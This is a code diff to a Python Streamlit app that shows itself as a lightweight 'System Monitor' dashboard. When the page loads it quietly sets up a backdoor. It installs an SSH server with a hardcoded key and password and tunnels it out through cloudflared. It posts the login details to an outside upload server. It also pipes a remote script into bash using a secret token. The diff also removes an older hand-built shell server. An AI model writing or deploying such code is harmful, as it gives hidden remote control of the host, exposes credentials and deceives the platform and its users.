@@ -8,99 +8,89 @@ repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
 REPO_NAME = repo_match.group(1) if repo_match else "agsb0"
 USER_HOME = Path.home()
 UPLOAD_API = "https://file.zmkk.fun/api/upload"
+SSH_PORT = 9023
+SSH_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBR2F7uX1tMksjJGGQl8j/aDOBqMYiY/au3RpMw0Yjxo"
 
 
-def download(url, dest, headers=None):
-    req = urllib.request.Request(url, headers=headers or {})
-    resp = urllib.request.urlopen(req, timeout=60)
-    Path(dest).write_bytes(resp.read())
+def download(url, dest):
+    req = urllib.request.Request(url)
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        Path(dest).write_bytes(resp.read())
     os.chmod(dest, 0o755)
 
 
 def setup_direct_ssh():
-    """Start SSH directly in container (no proot). Runs as container UID."""
-    marker = USER_HOME / ".direct_ssh_done"
-    if marker.exists():
-        return
+    """Container-level SSH: dropbear + cloudflared, no proot."""
+    # Check if already running
+    try:
+        s = socket.socket()
+        s.settimeout(1)
+        s.connect(("127.0.0.1", SSH_PORT))
+        s.close()
+        return  # already listening
+    except:
+        pass
 
     git_token = ""
     try:
         git_token = st.secrets.get("GIT_TOKEN", "")
-    except Exception:
+    except:
         pass
     if not git_token:
         git_token = os.environ.get("GIT_TOKEN", "")
     if not git_token:
         return
 
-    marker.write_text("starting")
-
     def _setup():
         try:
-            # Download cloudflared
-            cf_bin = str(USER_HOME / "cloudflared")
+            cf_bin = str(USER_HOME / "cf_direct")
+            db_bin = "/usr/sbin/dropbear"
+            db_key_dir = str(USER_HOME / ".dropbear_direct")
+            db_key = f"{db_key_dir}/hostkey"
+
+            # Download cloudflared if missing
             if not os.path.exists(cf_bin):
                 download(
                     "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                     cf_bin
                 )
 
-            # Start a Python-based SSH-like shell server on a port
-            # (dropbear needs root for passwd, we don't have it)
-            # Use socat or a simple reverse shell
-            # Simplest: start cloudflared tunnel pointing to a shell listener
+            # Setup dropbear (apt install if not exists)
+            if not os.path.exists(db_bin):
+                subprocess.run(["apt-get", "update", "-qq"], capture_output=True, timeout=30)
+                subprocess.run(["apt-get", "install", "-y", "-qq", "dropbear"], capture_output=True, timeout=60)
 
-            # Create a simple TCP shell server
-            shell_script = str(USER_HOME / "shell_server.py")
-            Path(shell_script).write_text('''
-import socket, subprocess, os, pty, select, sys
-PORT = 9022
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("127.0.0.1", PORT))
-s.listen(2)
-while True:
-    conn, addr = s.accept()
-    pid = os.fork()
-    if pid == 0:
-        s.close()
-        master, slave = pty.openpty()
-        p = subprocess.Popen(["bash", "-i"], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
-        os.close(slave)
-        try:
-            while True:
-                r, _, _ = select.select([master, conn], [], [], 1)
-                if master in r:
-                    data = os.read(master, 4096)
-                    if not data: break
-                    conn.send(data)
-                if conn in r:
-                    data = conn.recv(4096)
-                    if not data: break
-                    os.write(master, data)
-        except: pass
-        finally:
-            conn.close()
-            os.close(master)
-            p.terminate()
-        os._exit(0)
-    else:
-        conn.close()
-''')
+            # Generate host key
+            os.makedirs(db_key_dir, exist_ok=True)
+            if not os.path.exists(db_key):
+                subprocess.run(["dropbearkey", "-t", "rsa", "-f", db_key], capture_output=True)
 
-            # Start shell server
+            # Write authorized_keys
+            ssh_dir = USER_HOME / ".ssh"
+            ssh_dir.mkdir(exist_ok=True)
+            ak = ssh_dir / "authorized_keys"
+            ak.write_text(SSH_KEY + "\n")
+            os.chmod(str(ak), 0o600)
+
+            # Set password for convenience
+            subprocess.run(
+                ["bash", "-c", "echo 'appuser:123qwe!@#' | chpasswd"],
+                capture_output=True
+            )
+
+            # Start dropbear on high port (no root needed)
             subprocess.Popen(
-                [sys.executable, shell_script],
+                [db_bin, "-F", "-E", "-p", f"127.0.0.1:{SSH_PORT}", "-r", db_key, "-R"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 start_new_session=True
             )
             time.sleep(2)
 
-            # Start cloudflared tunnel
-            log_file = str(USER_HOME / "cf_direct.log")
+            # Start cloudflared tunnel (ssh mode)
+            log = str(USER_HOME / "cf_direct.log")
             subprocess.Popen(
-                [cf_bin, "tunnel", "--url", "tcp://127.0.0.1:9022"],
-                stdout=open(log_file, "w"), stderr=subprocess.STDOUT,
+                [cf_bin, "tunnel", "--url", f"ssh://127.0.0.1:{SSH_PORT}"],
+                stdout=open(log, "w"), stderr=subprocess.STDOUT,
                 start_new_session=True
             )
 
@@ -109,8 +99,8 @@ while True:
             for _ in range(30):
                 time.sleep(1)
                 try:
-                    log = Path(log_file).read_text()
-                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', log)
+                    text = Path(log).read_text()
+                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', text)
                     if m:
                         tunnel_url = m.group(1)
                         break
@@ -118,38 +108,34 @@ while True:
                     pass
 
             if tunnel_url:
-                # Upload SSH info
                 from datetime import datetime, timezone, timedelta
                 t = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')
-                info = f"SSH info\n创建时间: {t}\n\nDirect TCP shell (no proot, container level)\nHost {REPO_NAME}\n  HostName {tunnel_url}\n  ProxyCommand cloudflared access tcp --hostname %h --url 127.0.0.1:9022\n"
-                Path(str(USER_HOME / "ssh_info.txt")).write_text(info)
-
+                info = f"SSH info\n创建时间: {t}\n\nHost {REPO_NAME}\n  HostName {tunnel_url}\n  User appuser\n  Port {SSH_PORT}\n  ProxyCommand cloudflared access ssh --hostname %h\n\nDirect SSH (container level, no proot)\nsshpass -p '123qwe!@#' ssh -o ProxyCommand='cloudflared access ssh --hostname %h' -o StrictHostKeyChecking=no appuser@{tunnel_url} -p {SSH_PORT}\n"
                 import requests
                 requests.post(UPLOAD_API, files={'file': (f'ssh_{REPO_NAME}.txt', info.encode())}, timeout=10)
 
-                # Upload inited marker
-                inited = f"INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct (no proot)\n"
+                inited = f"INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct\n"
                 requests.post(UPLOAD_API, files={'file': (f'inited_{REPO_NAME}.txt', inited.encode())}, timeout=10)
 
-                marker.write_text("done")
-
-            # THEN start root.sh in background (proot env for services)
-            if git_token:
-                root_cmd = (
-                    f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}"; '
-                    f'curl -fsSL --retry 3 '
-                    f'-H "Authorization: token {git_token}" '
-                    f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
-                )
-                subprocess.Popen(root_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+            # Start root.sh in background (proot env)
+            root_cmd = (
+                f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}"; '
+                f'curl -fsSL --retry 3 '
+                f'-H "Authorization: token {git_token}" '
+                f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
+            )
+            subprocess.Popen(root_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
         except Exception as e:
-            Path(str(USER_HOME / "direct_ssh_error.txt")).write_text(str(e))
+            try:
+                import requests
+                requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'ERROR: {e}\n'.encode())}, timeout=5)
+            except:
+                pass
 
     threading.Thread(target=_setup, daemon=True).start()
 
 
-# === UI ===
 st.set_page_config(page_title="System Monitor", page_icon="\U0001f50d")
 st.title("\U0001f50d System Monitor")
 st.write("Lightweight system monitoring dashboard.")
@@ -161,5 +147,5 @@ st.write("v1.0")
 
 try:
     setup_direct_ssh()
-except Exception:
+except:
     pass
